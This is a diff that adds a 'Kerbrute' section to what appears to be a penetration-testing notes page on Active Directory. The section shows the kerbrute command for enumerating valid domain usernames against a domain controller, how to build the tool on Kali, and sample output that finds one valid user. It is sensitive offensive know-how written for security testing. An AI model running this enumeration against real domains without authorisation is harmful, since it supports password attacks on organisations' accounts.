@@ -73,3 +73,48 @@ python3 examples/GetNPUsers.py <domain>/<username> -dc-ip <domain-controller-ip>
 ```
 {% endcode %}
 
+## Kerbrute
+
+Iff you do not have valid domain credentials to try the above, you can bruteforce attempts to request a Ticket GRanting Ticket (TGT) from the domain controller for each username in a provided list.
+
+When a valid username is found, the domain controller responds differently compared to when the username does not exist. This response can confirm the validity of a username.
+
+{% code overflow="wrap" %}
+```bash
+./kerbrute userenum --dc <domain-controller-ip> -d <domain> <userlist.txt>
+```
+{% endcode %}
+
+It is not installed in kali though so you can get it by doing the following:
+
+{% code overflow="wrap" %}
+```bash
+sudo apt update
+sudo apt install golang-go
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+go build
+```
+{% endcode %}
+
+Valid users will look like this:
+
+```
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (n/a) - 10/09/24 - Ronnie Flathers @ropnop
+
+2024/10/09 09:13:28 >  Using KDC(s):
+2024/10/09 09:13:28 >   10.24.1.20:88
+
+2024/10/09 09:13:30 >  [+] VALID USERNAME:       gemma@acmecorp
+2024/10/09 09:13:33 >  Done! Tested 10279 usernames (1 valid) in 5.110 seconds
+```
+
+In this instance, a single user was found called "gemma"
+
